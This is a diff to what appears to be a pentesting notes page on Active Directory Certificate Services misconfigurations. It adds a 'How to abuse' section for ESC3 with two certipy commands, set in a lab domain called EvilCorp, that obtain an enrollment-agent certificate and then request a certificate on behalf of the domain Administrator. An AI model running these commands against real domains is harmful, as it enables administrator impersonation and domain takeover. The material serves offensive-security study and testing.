@@ -151,9 +151,26 @@ Example of a template that matches Condition 1:
   * The certificate template defines an EKU that allows for domain authentication.
   * Enrollment agent restrictions are not implemented on the CA.
 
-Example of a template that matches Condition 1:
+Example of a template that matches Condition 2:
 
 ![ADCSXMind](https://github.com/RayRRT/ADCS/blob/main/ESC3C2.png?raw=true)
+
+How to abuse:
+
+Request a certificate based on the vulnerable certificate template ESC3:
+```
+
+certipy req 'EvilCorp/TheHorseman:EvilCorp3.@EVILDC1.EvilCorp.local' -ca 'EvilCorp-EVILDC1-CA' -template 'Vulnerable ESC3'
+ 
+```
+Now, we can then use the Certificate Request Agent certificate (-pfx) to request a certificate on behalf of other another user:
+ 
+```
+
+certipy req 'EvilCorp/TheHorseman:EvilCorp3.@EVILDC1.EvilCorp.local' -ca 'EvilCorp-EVILDC1-CA' -template 'ESC3C2' -on-behalf-of 'EvilCorp\Administrator' -pfx 'thehorseman.pfx'
+ 
+```
+
 
 
 <a name="ECS4"></a>
